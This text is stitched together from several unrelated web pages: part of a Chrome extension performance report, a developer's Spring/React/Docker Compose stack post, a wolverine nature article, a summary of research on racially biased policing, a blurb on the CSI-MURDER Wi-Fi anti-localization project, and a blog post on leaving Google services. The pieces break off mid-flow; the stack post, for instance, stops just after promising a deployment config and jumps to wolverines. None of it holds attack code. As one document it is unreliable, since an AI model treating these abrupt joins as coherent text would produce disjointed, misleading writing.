<p>Note that the FCP impact of Avira isn't caused by request blocking logic running in the background. We'll see what's going there in the next section.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/extension-fcp.png" alt="Impact of Chrome extension on First Contentful Paint"></p>
<p>Chrome extensions can define scripts and stylesheets that should be injected into the page. By default these are added to the page once the page has finished loading and is idle.</p>
<p>However, extensions developers can decide to load these resources as soon as the page starts loading. For example, the Dark Reader extension changes website content to a dark theme. It would be jarring to first render pages in a bright theme and then suddenly transition. Here it makes sense to run the code before the page starts to render.</p>
<p>The amount of this code should be reduced to a minimum. The good news is that only 12 of the extensions in the chart cause a rendering delay of more than 100ms.</p>
<h4 id="clever-grammarly-rakuten-get-cash-back-for-shopping-last-pass">Clever, Grammarly, Rakuten Get Cash Back for Shopping, LastPass</h4>
<p>These extensions all run significant amounts of code before the page starts rendering. In the case of Clever, page content only starts showing 300ms later than without the extension installed.</p>
<h4 id="avg-avast-safe-price">AVG/Avast SafePrice</h4>
<p>While SafePrice doesn’t wait until the page is idle before injecting scripts, it does wait until the document has loaded. I'm not sure why, but somehow the JavaScript code still appears to run before the initial render.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/safeprice-trace.png" alt="SafePrice Trace showing FCP after content scripts have run"></p>
<h3 id="background-cpu-usage">Background CPU Usage</h3>
<p>Not all processing that a browser extension does happens on a page that's visible to the user. Most Chrome extensions also have something called a background page which lets the extension do things like listen to network requests or update the extension icon.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/background-page-cpu.png" alt="Background page CPU usage, with Avira spending alsmost 3s while Ghostery is a far-off second with 180ms"></p>
<p>Avira Browser Safety spends almost 3s running code in the background page, while all other extensions spend less than 200ms.</p>
<p>Background pages often run code in response to network requests made by the page that was opened by the user. The page from the previous test only makes one network requests, far less than normal. So I ran this test again, this time loading the Apple homepage, which makes around 50 requests.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/background-page-cpu-apple.png" alt="Background page CPU usage when loading Apple homepage, Ghostery spend a bit over 1s"></p>
<p>Interestingly Avira is now significantly faster, 600ms instead of 2.7s! What’s going on?</p>
<p>The Avira Browser Safety extension contains a website allowlist with 30k+ regular expressions. When the user navigates to a new page Avira checks if the page URL is in that allowlist:</p>
<pre><code>{
  <span>key</span>: <span>"_isWhitelisted"</span>,
  <span>value</span>: <span><span>function</span> <span>_isWhitelisted</span>(<span>url</span>) </span>{
    <span>return</span> !!<span>this</span>._whitelist &amp;&amp; <span>this</span>._whitelist.some(<span><span>function</span> (<span>pattern</span>) </span>{
      <span>return</span> pattern.test(url);
    });
  }
}
</code></pre>
<p>Apple.com is in the allowlist, and because the list is sorted alphabetically the function quickly finishes. Example.com is not in the list, so the extension ends up checking the URL against all 30 thousand regex patterns.</p>
<h3 id="browser-memory-consumption">Browser memory consumption</h3>
<p>Chrome extensions can increase memory consumption, both in pages opened by the user and in the extension background page.</p>
<p>Again, Avira Browser Safety is at the top of the list, increasing memory consumption by 218MB. This is due to the 30k+ regular expressions –&nbsp;I think they are compiled to bytecode or machine code, which needs to be stored in memory.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/top-100-extension-browser-memory-consumption.png" alt="Browser memory consumption –&nbsp;140MB with no extensions, many extensions raise that by 100-200MB"></p>
<p>Some background pages also contain iframes, for example the Amazon Assistant extension:</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/amazon-assistant-subframes.png" alt="DevTools Elements tab for Amazon Assistent background page showing multiple iframes"></p>
<p>An extension with a background page increases memory consumption by at least 10MB. If there’s no background page and only a small on-page script then an extension's the memory impact can be minimal.</p>
<h2 id="performance-impact-of-the-top-1000-extensions">Performance impact of the Top 1000 extensions</h2>
<p>Let’s look at some slightly less popular extensions with 100k+ users.</p>
<h3 id="page-cpu-usage-1">Page CPU Usage</h3>
<p>Previously Evernote had the greatest negative performance impact, increasing CPU times by 560ms. There are 9 extensions among the top 1000 with a greater negative impact than that.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/page-cpu-top-1000.png" alt="Vigia de Preco and Snap &amp; Read both spend over 1s of one-page CPU time"></p>
<h4 id="vigia-de-preco">Vigia de Preço</h4>
<p>Vigia de Preço is a Brazilian coupon and price watching extension with 200k users. It blocks the main thread for 1.6s.</p>
<p>A big part of this is using <a href="https://github.com/Valve/fingerprintjs2">fingerprintjs2</a> to generate a token. For example, this involves rendering an image and generating a data URL for it, in order to detect if certain Canvas features are supported by the browser.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/vigia-de-preco-trace.png" alt="Vigia de Preco Chrome trace showing fingerprinting"></p>
<h4 id="snap-amp-read">Snap &amp; Read</h4>
<p>Snap &amp; Read has over half a million users and helps them read and understand texts. On every page it loads a 3.8MB lexicon.js file, which is where most of the parse and compile time is spent. Parsing this would likely be much more efficient as a JSON file.</p>
<p>It then processes the lexicon and loads a bunch of libraries like <a href="https://github.com/spencermountain/compromise">compromise</a>, jQuery, pdfmake and citeproc. In total Snap &amp; Read loads 7.5MB of JavaScript code on every page.</p>
<h4 id="yi-ban-xiao-cha-jian">壹伴 · 小插件</h4>
<p>This is a Chinese Chrome extension with 300 thousand users. It seems mostly extend the WeChat web editor, but it loads 4MB of code on every page anyway.</p>
<h4 id="moz-bar">MozBar</h4>
<p>MozBar is an SEO tool with 700 thousand users. It doesn’t seem to do much unless you actually click the extension icon, but still runs 3MB of code.</p>
<h3 id="page-rendering-delays-1">Page rendering delays</h3>
<p>Do the additional processing block the page from rendering? Most of the time, no.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/rendering-delays-top-1000.png" alt="FCP increase by Top 1000 Chrome extension"></p>
<p>壹伴 · 小插件 loads 14 content scripts that take over 700ms to process before the page rendering starts. Axe loads two content scripts worth 1.8MB before the page is rendered.</p>
<h3 id="background-cpu-usage-1">Background CPU Usage</h3>
<p>Looking at background pages, no other extension exceeds the additional processing introduced by Avira Browser Safety and Avira Safe Shopping.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/top-1000-background-page-cpu.png" alt="Top 1000 Chrome extension background CPU consumption"></p>
<h4 id="traffic-light">TrafficLight</h4>
<p>Bitdefender TrafficLight is a security extension with 600k users. It checks request URLs against a list of several thousand criteria that might indicate a security issue. To do that it needs to iterate over that list and check if the current URL matches.</p>
<p><img src="https://www.debugbear.com/public/blog/2020-chrome-extension-performance-report/traffic-light-bg-cpu.png" alt="TrafficLight trace showing getRule, runRule, and runMetaRule"></p>
<h3 id="browser-memory-consumption-1">Browser memory consumption</h3>
<p>Interestingly, on a page without ads, ad blockers significantly increase browser memory consumption. This is mostly due to …</p></div></div></div></div></div>

          <strong>My current default boilerplate for building web apps: Spring, React, Postgres and Docker Compose on a raw VM</strong>
          </p>
        </header>
      

      <section itemprop="text">
        
        <p>Inspired by Sam Texas’ blog post “<a href="https://www.simplecto.com/docker-django-traefik-intercoolerjs-is-my-stack-for-2021/">Docker, Django, Traefik, and IntercoolerJS is My Go-To Stack for Building a SaaS in 2021</a>” and the accompanied <a href="https://news.ycombinator.com/item?id=25973242">Hacker News thread</a> I decided to write my own version. Not because I think my approach is better (frankly, it’s very similar) but because it’s fun and it will be interesting looking back at it in 5 years.</p>

<p>What I’ll describe below is a stack that <em>I</em> am personally comfortable with and which <em>to me</em> strikes a pretty good balance between budget, ease-of-use and productivity. But as HN user <em>ssijak</em> points out nicely in the linked HN thread:</p>
<blockquote>
  <p>Goto stack for building SaaS is the one you know the best.</p>
</blockquote>

<p>With that being said, let’s get started. This is my stack for 2021:</p>

<ul>
  <li><strong>Spring Boot</strong> backend</li>
  <li><strong>React</strong> in case of SPA</li>
  <li><strong>PostgreSQL</strong> as database</li>
  <li><strong>Docker Compose</strong> as deployment platform</li>
  <li><strong>Nginx</strong> as reverse proxy</li>
  <li><strong>Hetzner Cloud</strong> for hosting</li>
  <li><strong>Ansible</strong> for infrastructure automation</li>
  <li><strong>Github actions</strong> for CI/CD</li>
</ul>

<h2 id="application-level">Application Level</h2>

<h3 id="spring-boot">Spring Boot</h3>
<p>Spring Boot is my go-to backend technology for the simple reason that it allows me to get stuff done. With Spring Boot, it feels like the only code you write is business logic. There’s barely any glue code or plumbing, you just fill in the gaps, everything else is taken care of. Working with Spring makes you realize how much time you wasted reinventing the wheel and writing code that brings absolutely zero value.</p>

<p>What Spring is for me is Django or Ruby on Rails for others. Ultimately, which one you pick doesn’t really matter. At this point it’s more of a cultural thing: If you started your career in California you’d probably be more inclined to pick Rails but I grew up in Europe, where Spring is more commonplace. In terms of features, they’re equivalent as far as I’m concerned.</p>

<p>Now, a few things need to be said about Java. Java still has its shortcomings but it has been making great strides in the right direction:</p>
<ul>
  <li><strong>Verbosity</strong>: When people think of Java they think of unnecessary boilerplate. I’m happy to announce that those days are gone: <a href="https://projectlombok.org/features/all">Project Lombok</a> removes a large part of Java’s inherent verbosity. Also, with every language iteration more and more quality of life improvements are added: <a href="https://docs.oracle.com/en/java/javase/15/language/local-variable-type-inference.html">type inference via <code>var</code> keyword</a> and <a href="https://docs.oracle.com/en/java/javase/15/language/records.html">record classes</a> are just two examples.</li>
  <li><strong>Asynchronous programming and concurrency</strong>: What has irked me for a long time is Java’s subpar support for asynchronous programming - but that has been taken care of as well thanks to projects such as <a href="https://github.com/ReactiveX/RxJava">Reactive Extensions</a> and <a href="https://projectreactor.io/">Project Reactor</a>. Hell, we’ll even get true fibers with <a href="https://wiki.openjdk.java.net/display/loom/Main">Project Loom</a> in the near future.</li>
  <li><strong>Heavy weight</strong>: Sure, the JVM is still heavy. An idle Spring app takes 200 - 300 MB of RAM. And I acknowledge that this might be a deal breaker for some but IMO the productivity gains are more than worth it. Let’s also not forget that the JVM is an <em>incredibly</em> powerful piece of technology, so when you need the power you have it at your fingertips.</li>
</ul>

<p>Like it or not, Java is as relevant as ever and it will stay that way for many more years.</p>

<h3 id="react-frontend">React Frontend</h3>
<p>I firmly believe that SPAs are vastly overused and that in many cases you can get away with simple server-side rendering. But I’m not one of those who reject SPAs <em>out of principle</em>. For applications that are heavy on the interaction side I currently go with React. This choice has nothing to do with me being a flaming React fanboy (far from it) but again, with how comfortable I am working with it. I just so happened to be doing some work with React in previous projects and was able to gain a decent grasp of it in the process. React has long surpassed the point where I would call it “mature” and the documentation and community support is superb. For someone who’s primarily a backend developer and who does some frontend work because it <em>needs</em> to be done that’s all I could ever ask for.</p>

<p>I store my frontend code alongside the backend code in a mono repo and serve the static files from Spring’s embedded Tomcat Webserver. I really like being able to deploy frontend and backend in one go.</p>

<h3 id="postgresql">PostgreSQL</h3>
<p>I think nothing really needs to be said about Postgres. It’s just a no-brainer. When I look back at previous projects Postgres has been the technology that throughout caused the least amount of trouble - by far. You spin it up and it simply does what it’s supposed to do. A certain degree of SQL knowledge is required of course and it doesn’t hurt to know the SQL tuning basics: indexing, denormalization, materialized views, <code>EXPLAIN ANALYZE</code>, etc… But in most cases you won’t even get into the situation where you need to optimize it.</p>

<p>In addition, Postgres makes for a great task queue for asynchronous workloads. No need to introduce Redis, just use your existing Postgres with <a href="https://www.postgresql.org/docs/current/sql-select.html#SQL-FOR-UPDATE-SHARE"><code>FOR UPDATE SKIP LOCKED</code></a>.</p>

<h3 id="logging--monitoring">Logging / Monitoring</h3>
<p>Logging and monitoring is the only real pain point in my set up. Self-hosting an ELK stack is not really viable and lighter-weight alternatives are few and far between. So far, I had to resort to grepping raw logs from the containers which works alright (grep stronk!!1 💪) but if you have a better idea, please let me know! I’m currently contemplating sending all logs over to AWS Cloudwatch via <a href="https://docs.docker.com/config/containers/logging/awslogs/">Docker log driver</a> although I’m really not a fan of the product itself, but hey, it’s super cheap.</p>

<h2 id="infrastructure-level">Infrastructure Level</h2>

<h3 id="docker-compose-as-deployment-platform">Docker Compose as deployment platform</h3>
<p>For simple projects and early stage startups Docker Compose really is enough. If you only need to run a handful of containers and you don’t have crazy scaling requirements (most applications don’t) there’s no need to bother with Kubernetes. Did you know that you can <a href="https://docs.docker.com/compose/compose-file/compose-file-v3/#replicas">scale containers in and out</a> with Docker Compose? With some <a href="https://stackoverflow.com/questions/49090395/how-to-achieve-a-rolling-update-with-docker-compose">tricks</a> you can even achieve rolling updates! Anyway, my boilerplate Docker Compose stack consists of the following containers:</p>

<ol>
  <li><strong><a href="https://github.com/nginx-proxy/nginx-proxy">Nginx proxy</a></strong>: Unsurprisingly, this container runs an nginx reverse proxy. The cool thing about it is that it listens on the Docker socket for newly created containers. If a new container has the <code>VIRTUAL_HOST</code> environment variable set the proxy will automatically create a route to that container using the specified virtual host. When I want to host another application, I just spin up the container with <code>VIRTUAL_HOST</code> value set to e.g. “myapp.mydomain.com” and seconds later I can reach the application on myapp.mydomain.com.</li>
  <li><strong><a href="https://github.com/nginx-proxy/docker-letsencrypt-nginx-proxy-companion">Let’s Encrypt proxy companion</a></strong>: A container running alongside the nginx proxy that automatically issues and renews Let’s Encrypt certificates for the specified virtual hosts.</li>
  <li><strong><a href="https://github.com/containrrr/watchtower/">Watchtower</a></strong>: Watchtower regularly checks whether an updated image is available for any of your running containers, and if so performs a (rolling) update. Automatic updates can be turned off for individual containers that you don’t want to randomly restart, like the database.</li>
</ol>

      My setup: Running Docker Compose as deployment platform.

    </figcaption></figure>

<h3 id="hetzner-cloud-for-hosting">Hetzner Cloud for hosting</h3>
<p>My Docker Compose stacks typically run on an ordinary Linux VM on <a href="https://www.hetzner.com/cloud">Hetzner Cloud</a> but any hosting provider suffices really. The reason I’m choosing Hetzner over Digital Ocean or Linode is its <em>truly thrifty™</em> pricing. 2.96€/mo for 1 vCPU / 2 GB RAM / 20 GB disk, it doesn’t get cheaper than that.</p>

<h3 id="ansible-for-infrastructure-automation">Ansible for infrastructure automation</h3>
<p>For some reason, Ansible has always scared me. Maybe because when you’re dealing with Ansible you’re leaving the nice and cozy, cotton candy developer world and enter the murky, obscure realm of die-hard Linux system administration. Ansible is one of the tools that I never understood what its good for and what exactly the difference is to Chef and Puppet. But as it turns out, it’s really not that scary. It’s simply a tool that helps you set up and manage your raw Linux box. It covers the stuff that comes <em>before</em> running Docker, like for example <em>installing</em> Docker. I’m sure there millions of advanced use cases for Ansible, like managing entire <em>fleets</em> of servers but what <em>I</em> am using it for is only the initial setup of my VM. Steps that I would typically do manually once I first login to the VM: setting up users and installing packages in particular. The benefit of doing it via script (as opposed to manual) is that it’s repeatable, versioned and documented in code. So when I decide to move a project to another hosting provider I can simply reconfigure a new server address and launch a new environment within seconds. I typically use a version of <a href="https://gist.github.com/dhet/59cc8c8c3f0ef7f5604bdf2af7f0b960">this playbook</a> which sets up a Linux environment with Docker ready to use and basic security precautions applied (firewall, automatic updates, disabled password login, etc.).</p>

<p>Additionally, I’m making use of <a href="https://docs.ansible.com/ansible/latest/user_guide/vault.html">Ansible Vault</a> which allows you to encrypt files (like .env files containing secrets) so that they can be checked into git. The files can then be decrypted by the deployment pipeline using the <a href="https://github.com/anthonykgross/ansible-vault-cli-github-action">Ansible Vault Github action</a>.</p>

<h3 id="github-actions-for-cicd">Github actions for CI/CD</h3>
<p>CI/CD has never been easier than with Github actions. It’s so dead simple I’ll just post a deployment workflow config and it will explain itself.</p>

<div>
<p>In Innu culture,&nbsp;the wolverine&nbsp;is a trickster, the central character in many dramatic capers. Sometimes the wolverine is a hero, saving Innu families from vicious cannibals; other times he’s a scoundrel tricking both&nbsp;the Innu and his fellow animals. Either way, it’s guaranteed that he’s getting into mischief.</p>
</div>
</div>
<p>Filmmaker Christine Poker, who comes from the Innu community of Natuashish in northern Labrador, grew up hearing stories around the tent stove about the conniving&nbsp;Kuekuatsheu, the name for the wolverine in her language of Innu-aimun.</p>
<p><img alt="A family of wolverines walks across the snow covered ground" src="https://cangeo-media-library.s3.amazonaws.com/s3fs-public/images/web_articles/article_images/6363/_2350225.jpg"></p>
<p>For the Innu, Kuekuatsheu is more than just a character in a story; he is almost a part of the community. Elders still talk of him as if they know him personally, as if they witnessed his antics themselves. Poker says she remembers her grandparents telling her stories of how Kuekuatsheu would steal food from their camp.</p>
<p>“My grandparents said that when the Innu people started dying and leaving the country [to settle in larger communities], Kuekuatsheu left with them,” Poker explains. She notes that when she is in her community with her grandkids, they’re less interested in hearing the stories of the wolverine. But that all changes when they are on the Land. In their tent at night, the young people are eager to hear the stories of Kuekuatsheu.</p>
<div title="Page 34">
<div>
<div>
<p>It is not difficult to determine where the idea of the wolverine being a trickster comes from. Though reclusive, these animals are also renowned for being curious and sneaky. They have been known to steal bait from traps, ransack cabins and elude hunters. If you see a wolverine in the wild, consider yourself lucky — they tend to avoid areas inhabited by people, have an extremely low population density and are most active from dusk to dawn when most people are asleep.</p>
<p>Although they resemble small bow-legged bears with bushy tails, wolverines are actually the largest members of the&nbsp;Mustelidae&nbsp;family, which includes weasels, badgers and&nbsp;otters. Adult males can weigh up to 14 kilograms, and adult females can weigh up to nine kilograms. They have small ears, a stubby nose and sharp teeth, as well as sharp semi- retractable claws. They are also known to be ferocious, with a bark as bad as their bite. Their growl can best be described as a cross between a lion’s roar and the engine of a small plane — it’s a startling sound to hear when you’re walking alone in the woods and no doubt adds to the creature’s mystique.</p>
<p><img alt="A wolverine stares at the camera, its face covered in ice and snow" src="https://cangeo-media-library.s3.amazonaws.com/s3fs-public/images/web_articles/article_images/6363/wolverinepetermather1a.jpg"></p>
<div title="Page 34">
<div>
<div>
<p>Wolverines play a generalist’s role in their ecosystem and will eat just about anything, from berries and&nbsp;vegetation to meat and carrion. They hunt smaller animals — their favourite meal is the beaver — but are often scavengers, eating the remains of larger animals such as moose and caribou that have been taken down by wolves. There are, however, also verified accounts of wolverines killing large ungulates such as deer and caribou by stalking them over long periods, exhausting their prey before going in for the kill.</p>
<div title="Page 35">
<div>
<div>
<div>
<p>One of the wolverine’s greatest survival adaptations is its bite; the muscle and bone structures in their heads give them a powerful jaw for such a small creature. A special upper molar at the back of their mouths is rotated 90 degrees toward the inside of their mouth, allowing them to chomp through bone to get at the marrow inside. They have no problem tearing through frozen flesh. As a result, the scat of wolverines is easy to identify because it’s full of bone fragments.</p>
<p>Wolverines are active year-round, although like most forest life they are quieter in the winter. They breed in early summer and give birth to one or two kits in the late winter or early spring. Their thick coats protect them from the frost and cold, and their wide snowshoe-like feet are perfectly adapted for moving through deep snow. They need that deep snow cover to insulate their dens from harsh winter conditions. While these adaptations are important for the wolverine’s survival, they also make them susceptible to the impacts of global warming.</p>
<div title="Page 35">
<div>
<div>
<div>
<p>That thick, warm fur that wicks away frost once made wolverine pelts a prized part of the North American fur trade. Their fur, which was often used to line the hoods of&nbsp;parkas, once led to the animal being trapped in great numbers. Their populations in southern Canada have never fully recovered.</p>
<p><img alt="A wolverine climbs down a hole, its face covered in snow" src="https://cangeo-media-library.s3.amazonaws.com/s3fs-public/images/web_articles/article_images/6363/wolverinepetermather3.jpg"></p>
<div title="Page 36">
<div>
<div>
<p>Indeed, though their range once stretched across much of southern Canada, they are now largely found in the boreal forests, mountain ranges and tundras that stretch across much of the North. With an average of just three to 10 animals typically found in a thousand square kilometres, a single wolverine can maintain a territory of hundreds of square kilometres, walking great distances every day to patrol for food and to drive away any would-be competition. A dominant male wolverine will overlap its territory only with one or two females with which it breeds.</p>
<p>Like all the animals in the&nbsp;Mustelidae&nbsp;family, wolverines have very&nbsp;well-developed scent glands, which they use to mark their territories to warn other wolverines to stay away. That’s why young wolverines, which remain with their family for up to a year, will often travel hundreds of kilometres to establish a territory far away from other wolverines.</p>
<p><img alt="A wolverine walks across the snow" src="https://cangeo-media-library.s3.amazonaws.com/s3fs-public/images/web_articles/article_images/6363/wolverinepetermather1aa.jpg"></p>
<div title="Page 37">
<div>
<div>
<p>It was once believed that wolverines lived solitary lives, getting together only to breed during the summer. Although this is mainly true, researchers using GPS collars to track the animals have discovered that wolverines are more social than originally thought.</p>
<div title="Page 40">
<div>
<div>
<p>Matthew Scrafford, an ecologist with Wildlife Conservation Society Canada, has been studying wolverines in northern Ontario for more than three years. In that time, his GPS data has shown both wolverine parents hunting and scavenging with their offspring for days at a time. “They’re a family unit,” Scrafford explains. “They’re learning from each other and teaching their off- spring. Before a lot of this good GPS data and cameras started coming in, we thought of them as loners — and&nbsp;they are — but they do spend a lot of time roaming around the landscape with each other.”</p>
<div title="Page 40">
<div>
<div>
<p>A healthy wolverine population is a strong indicator of a healthy eco-system, Scrafford says, since the species requires a variety of foods gathered from large intact areas of interconnected wilderness — in other words, they need lots of types of food and lots of space to roam.</p>
<p>“We have found that in as far as they can withstand some human development, they’re not purely a wilderness species,” says Scrafford. “You do find wolverines in developed landscapes and&nbsp;forestry working landscapes. They don’t need pure wilderness to exist, although they have low density and low reproductive rates, so you have to watch what happens to their territory, or else they’re going to blink out of existence.”</p>
<p><img alt="Wolverine paw-prints on fresh snow" src="https://cangeo-media-library.s3.amazonaws.com/s3fs-public/images/web_articles/article_images/6363/wolverinepetermather5.jpg"></p>
<div title="Page 40">
<div>
<div>
<p>Today, the biggest threat to wolverines is habitat loss and human development. Researchers are working with Indigenous communities across the North to track and monitor wolverine populations to better understand how their habitats are being affected by human encroachment. The trickster hero — ferocious, clever and strong — will need all of its ingenuity to continue to flourish.</p>

<p><strong>January 21, 2021</strong></p>



<p>Not only are black people more likely than white people to be stopped by police, but new research in <em><a rel="noreferrer noopener" href="https://journals.sagepub.com/doi/full/10.1177/2372732220943639" target="_blank">Policy Insights from the Behavioral and Brain Sciences</a> </em>documents that the darker you are, the more likely you are to be shot.</p>



<p>Conversely white people with very white skin are less likely to have force used against them.&nbsp; “Whiteness serve(s) as a protective factor,” <strong>Kimberly Barsamian Kahn</strong> and <strong>Karin D. Martin</strong> explain in “<a href="https://journals.sagepub.com/doi/full/10.1177/2372732220943639" target="_blank" rel="noreferrer noopener">The Social Psychology of Racially Biased Policing: Evidence-Based Policy Responses</a>.”</p>



<p>Communities nationwide are trying various strategies to combat the inherent bias and stereotyping that not only target black people but also can cause perpetrators to deny feelings of pain experienced by minorities, such as Freddie Gray, who had his spinal cord broken while in police transport, and George Floyd, who died as a white officer kneeled on his throat.&nbsp;</p>



<p>While these strategies–community policing, body cameras, officer training on biases, etc.–have the potential to lead to better police outcomes, a key ingredient still is needed: a national database of policing outcomes.&nbsp;</p>



<p>Without comprehensive data, any efforts at reforming police behaviors are compromised.</p>



<p>According to the researchers, the latest effort to create such a database could come through passage of the “<a href="https://www.congress.gov/bill/116th-congress/house-bill/7120" target="_blank" rel="noreferrer noopener">George Floyd Justice in Policing Act of 2020</a>,” a bill introduced by the U.S. House of Representatives.&nbsp; The bill not only recommends cameras and other strategies that have shown promise, but it also adds the creation of a national, coordinated effort to collect and analyze police use of force.</p>



<p>Such a database “would significantly aid in assessing, and addressing, racial biases in police outcomes,” the researchers state.</p>



<p>Federal efforts to create a comprehensive database, thus far unsuccessful, include the 2014 reauthorization of the Death in Custody Reporting Act of 2000.&nbsp; The act requires states to provide quarterly reports of anyone incarcerated or in police custody, but the extent of compliance “remains unclear,” according to the research.</p>



<p>The Bureau of Justice Statistics, through what the researchers describe as a “laborious process,” also attempted to generate data on deaths in custody.&nbsp; Among other findings, they learned that during a three-month period, the media reported 377 deaths while law enforcement agencies reported 48.</p>



<p>The latest attempt, the George Floyd Act, would institute the much-needed, comprehensive, nationwide database; it also would create a National Police Misconduct Registry to reduce the rehiring of problematic officers, and it would ban “no knock” warrants, which occurred in the death of Breonna Taylor, and tactics such as the choke hold that killed Floyd.</p>



<p>The bill also would require the use of body cameras, police training on implicit bias and other strategies that, collectively, “all…have the potential to reduce bias if they are enacted and enforced.”</p>

<p><img src="https://ans.unibs.it/assets/images/csimurder.png">
CSI-MURDER takes the move from one of the most flourishing research topics in wireless networks: the ability to exploit communication signals to sense the surrounding environment and hence to localize people and possibly objects.
Instead of proposing yet another localization system, this project explores the possibility of preventing unauthorized localization without hampering the communication performance.
Sensing techniques use the Channel State Information (CSI) embedded in each Wi-Fi frame for understanding how wireless signals propagate in the environment: for instance, by measuring how CSI amplitude changes over time it is possible to detect human presence or motion, recognize different types of activity, even detect specific gestures or measure human breathing, albeit these fine-grained detection has proven hard to replicate.
This project tackles the problem of neutralizing un-authorized surveillance while preserving the communication performance. To this end, we implemented a number of functions for modifying Wi-Fi frames before they are transmitted over the channel in such a way that their content can still be decoded, while the CSI appears as being randomly generated so that eavesdroppers cannot use CSI for sensing the environment.</p>

<hr>
<h3 id="an-example">An example</h3>

<p><img src="https://ans.unibs.it/assets/images/privacy-attack.png"></p>

<p>Imagine someone wants to illegally track the position (and implicitely the time spent) by someone into a laboratory, for instance to track how much time is spent into different activities to be performace ad different desks/instruments, as depicted in the upper picture. How much effective can this attack be?</p>

<p>Actual experiments, reported in the lower picture on the left, tells us the CSI-base localization can be extremely accurate, as all the stimated poings(the marks) basically falls within the circle representing the position where the person in the lab was sitting working. With CSI-MURDER instead the localization becomes impossible, giving random results, thus preserving the person privacy without destroying Wi-Fi communications.</p>

    <h2>How Google's insidious* behavior led me to find superior alternatives.</h2>
    
    <p><img src="https://www.quitfacebook.org/file/media/google-sign-out.png" alt="Google warning: 'Couldn't sign you in'"></p><p>I saw the above warning using <a href="https://vivaldi.com/">Vivaldi</a>: a successful and powerful Chromium based browser. There's nothing insecure about it. I tried to fix the problem by disabling all extensions, clearing all browser data, and enabling “less secure app access” in the Google account settings. Alas. The only solution I found was reinstalling the browser. But after having done so—five times—each time when clearing the cookies, or enabling a VPN, it wouldn't let me sign in again. Then the following email found my inbox.</p>

    <p><img src="https://www.quitfacebook.org/file/media/google-warning.png" alt="Google warning: someone knows the password to your linked Google account"></p><p>“Someone knows the password to your linked Google Account”… Me. It was <em>me</em>! Obviously <em>I</em> know the password to my linked Google account. Forced to change my password I was duly annoyed. I realized how dependent I was. If Google unpredictably revokes access to your account, you can't log into anything else of their services: YouTube, Gmail, Play Store, Docs, Drive, Calendar, etc. Fortunately I already did a partial Google and social media exodus. Nevertheless, even when only using YouTube and Google Play, losing access startled me. Therefore, because I don't want to be put in this position again, I completed the exodus: discarding the need for a Google account.</p>

    <p>A quick aside, I have nothing against monopolies as a general rule. Usually they grow so big because of a significantly superior service <sup>(1)</sup>. But as convenient as they may be—even though their products aren't superior anymore—if their power goes to their head and they start pulling insidious shenanigans, like using false claims to deter people from browsers other than Chrome, then I'm out.</p>

    <p>So that's exactly what I did and I was pleasantly surprised by the results. Believe it or not but my phone is more responsive and the battery lasts longer. Although the former might be due to the factory reset, I assume the latter has to do with the decrease in background processes due to 1. removing my Google account 2. subsequently disabling Google Play Store 3. disabling everything in the settings tab called Google services &amp; preferences. Digital minimalism, it's so incredibly satisfying. You should try it. Your life was perfectly fine before you had all that extra stuff to worry about (or pay for); I learnt that from my teacher, Diogenes of Sinope, 404 – 323 BC.</p>

        </td>
      </tr>
    </tbody></table>

    <h2>Alternatives to Google.</h2>
    <p>Diogenes would suggest living on the streets, but I'm unsure if that's feasible, and you'd still be overwhelmed by ads. So what to do? One could completely avoid Google as there is plenty competition to choose from. A quick search for “Google alternatives” or a peek at <a href="https://nomoregoogle.com/">No More Google</a> or <a href="https://degoogle.jmoore.dev/">degoogle</a> can suffice. Although, realistically, one will want to keep using some of their services, preferably without an account. As was the case for me.</p>

    <h3>YouTube.</h3>
    <p>YouTube has a lot of content nowhere else to be found. Fortunately one doesn't need an account (yet) to simply watch these videos. However, sometimes logging in is required. To <strong>circumvent logging in</strong>, use the YouTube front-end <a href="https://invidio.us/">invidio.us</a>, and select an instance such as ytprivate.com. It uses YouTube in the background, but discards the bullshit, making the website much faster. Just enter a search term, or copy-paste the YouTube URL or video ID, and you're good to go. If you require <strong>playlists</strong> or <strong>subscriptions</strong>, Invidious supports that too if you register. Importing or exporting data from other Invidious instances is possible as well.</p>

    <p>If you want to manually create a playlist on YouTube without an account, append the following URL with the YouTube video IDs separated by commas, for example: https://www.youtube.com/watch_videos?video_ids=xUozVQVt1xI,ed0fRdTma9I.</p>
    
    <p>When on <strong>mobile</strong>, <a href="https://newpipe.net/">NewPipe</a> is the way. There are other YouTube front-ends, but I strongly recommend NewPipe because: it is highly configurable, it supports background play on a locked phone, it features easy downloading, it has <em>no</em> ads, it works hand in hand with PeerTube and Invidious, it's super fast, etc.</p>
    
    <h3>Google Play Store.</h3>
    <p>The Google Play store is something I was most worried about. I assumed using “their” apps necessitated a Google account. Not necessarily. <strong>The free apps don't require an account, the paid apps do</strong>. For example, I purchased Wolfram Alpha but can't install it without Google Play Store. And even if I could, I'd need my Google account as a receipt to reactivate it. In total I have 14 apps and one digital book I paid for. But as time passed I found better and free alternatives to all of them, or I merely donated to support their decision to refuse ads, not their premium functions. However, I can understand if this is a dealbreaker to those who are dependent on non-free apps.</p>
      
    <p>Anyway, to install an app you just need an .apk file. But to avoid a time-consuming process, there are alternative app catalogues such as <a href="https://f-droid.org/en/"><strong>F-Droid</strong></a> and <a href="https://auroraoss.com/app_info.php?app_id=1"><strong>Aurora Store</strong></a>, these will serve most of your needs. I suggest perusing F-Droid first because its apps are FOSS (Free and Open Source Software); more than half of mine are on it. Here's a list of everyting I use: <a href="https://www.quitfacebook.org/file/software.html">quitfacebook.org/file/software.html</a>.</p>

    <p>Not going to lie, it feels good to release the shackles; Google Play Store is disabled and everything works just fine. However, Google Play <em>services</em> needs to remain enabled for functionalities such as auto updates, push notifications, or geolocation <sup>(2)</sup>. I can live with that, for now, but the decreased battery life is noticeable. If that's too much to ask, just disable it, or consider the alternative <a href="https://en.wikipedia.org/wiki/MicroG">MicroG</a>. I can't vouch for it yet, but it looks promising.</p>

    <h3>Gmail.</h3>
